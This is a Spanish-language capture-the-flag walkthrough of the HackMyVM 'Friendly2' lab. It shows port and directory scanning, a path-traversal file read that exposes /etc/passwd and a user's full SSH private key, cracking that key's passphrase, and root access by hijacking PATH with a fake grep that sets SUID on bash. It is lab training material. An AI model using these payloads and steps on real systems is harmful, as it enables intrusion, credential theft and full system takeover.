---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Friendly2 HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 03:11 EDT
Nmap scan report for 192.168.5.17
Host is up (0.0021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)
|_  256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Servicio de Mantenimiento de Ordenadores
MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds
```

Veremos un puerto `80` bastante interesante, que aloja una pagina web, que si entramos veremos simplemente una web de servicio de ordenadores, pero nada mas, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.17/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/tools                (Status: 200) [Size: 813]
/assets               (Status: 200) [Size: 1547]
/index.html           (Status: 200) [Size: 2698]
/.php                 (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 384707 / 882244 (43.61%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 385588 / 882244 (43.71%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas interesantes, entre ellas el directorio llamado `/tools` si entramos dentro del mismo veremos otra pagina simple que pone `informacion privada` pero nada mas interesante, vamos a realizar `fuzzing` dentro de dicho directorio de nuevo.

```shell
gobuster dir -u http://<IP>/tools -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.17/tools
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 813]
/.html                (Status: 403) [Size: 277]
/documents            (Status: 200) [Size: 1371]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos de nuevo cosas interesantes, pero entre ellas el directorio llamado `/documents` que si entramos dentro del mismo veremos una serie de archivos, vamos a probar a meternos en los `htmls` pero no veremos gran informacion, ahora si volvemos a `/tools` e inspeccionamos el codigo veremos lo siguiente:

## Escalate user gh0st

```html
<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
```

Veremos esa parte interesante, que nos esta indicando un archivo con extension `.php` a parte de un parametro que por lo que se entiende funciona para realizar una llamada a un archivo, por lo que vamos a intentar realizar un `LFI` a ver si funciona con dicho parametro.

```
URL = http://<IP>/tools/check_if_exist.php?doc=../../../../../../etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
gh0st:x:1001:1001::/home/gh0st:/bin/bash
```

Vemos que ha funcionado, ya que estamos viendo los usuarios, vemos uno llamado `gh0st`, ya que podemos leer archivos vamos a probar a intentar leer su clave `PEM` si tuviera alguna y si fuera accesible.

```
URL = http://<IP>/tools/check_if_exist.php?doc=../../../../../../home/gh0st/.ssh/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
9tDhjVw3oagRmc3R03zfIwbPINo=
-----END OPENSSH PRIVATE KEY-----
```

Vemos que ha funcionado de forma correcta, por lo que nos conectaremos por `SSH` mediante dicho usuario con su `id_rsa`.

### SSH

```shell
nano id_rsa

#Dentro del nano
<CLAVE_ID_RSA>
```

Lo guardamos y establecemos los permisos necesarios para que se comporte como tal.

```shell
chmod 600 id_rsa
```

Ahora intentaremos conectarnos.

```shell
ssh -i id_rsa gh0st@<IP>
```

Info:

```
Enter passphrase for key 'id_rsa':
```

Vemos que nos pide la contraseña de dicha clave, por lo que vamos a intentar `crackearlo` de esta forma.

```shell
ssh2john id_rsa > hash.ssh
```

```shell
john --wordlist=<WORDLIST> hash.ssh
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celtic           (id_rsa)     
1g 0:00:00:06 DONE (2025-05-15 03:25) 0.1663g/s 42.59p/s 42.59c/s 42.59C/s tiffany..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que hemos obtenido la contraseña de dicha clave, por lo que ahora si vamos a repetir el proceso de conectarnos por `SSH` pero ahora metiendo la clave.

```shell
ssh -i id_rsa gh0st@<IP>
```

Metemos como contraseña `celtic` y veremos que estamos dentro.

Info:

```
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ whoami
gh0st
```

Vamos a leer la `flag` del usuario.

> user.txt

```
ab0366431e2d8ff563cf34272e3d14bd
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

Vemos que podemos ejecutar dicho `script` como el usuario `root`, vamos a ver como funciona por dentro.

```bash
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

Vemos una cosa bastante interesante en el script, y es que esta utilizando una ruta relativa para llamar al binario `grep` y no una `absoluta` por lo que podremos realizar un `Path Hijacking` y lo haremos de esta forma.

```shell
cd /tmp
nano grep

#Dentro del nano
#!/bin/bash

echo "Permisos establecidos de forma correcta."
chmod u+s /bin/bash
```

Lo guardamos y ahora exportamos la variable de entorno para que apunte a `/tmp` y se ejecute nuestro binario malicioso.

```shell
chmod +x /tmp/grep
export PATH=/tmp:$PATH
```

Ahora tendremos que ejecutar el binario de la siguiente forma:

```shell
sudo PATH=/tmp:$PATH /opt/security.sh
```

Info:

```
Enter the string to encode:
$$$
Permisos establecidos de forma correcta.
The string cannot contain special characters.
```

Veremos que ha funcionado aparentemente, vamos a comprobarlo:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Vemos que ha funcionado de forma correcta, por lo que haremos lo siguiente para ser el usuario `root`.

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Veremos que con eso ya seremos `root` por lo que leeremos la `flag` de `root`.

Pero si intentamos leerla pone esto:

```
ot yet! Try to find root.txt.


Hint: ...
```

Vamos a buscar por esos `...` ya que por `root.txt` no veremos nada.

```shell
find / -name "..." 2>/dev/null
```

Info:

```
/...
```

Si entramos dentro veremos un archivo llamado `ebbg.txt` que si lo leemos veremos lo siguiente:

```
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified
```

Vamos a seguir la pista.

```shell
bash /opt/security.sh
```

Info:

```
Enter the string to encode:
nqssrsrqpnoq
Permisos establecidos de forma correcta.
chmod: changing permissions of '/bin/bash': Operation not permitted
Original string: nqssrsrqpnoq
Encoded string: adffefedcabd
```

Ahora si sustituimos las letras de antes sin que afecte los numeros, quedaria la `flag` algo asi.

> root.txt

```
98199a723d0f44f6ef39e33685d8cabd
```
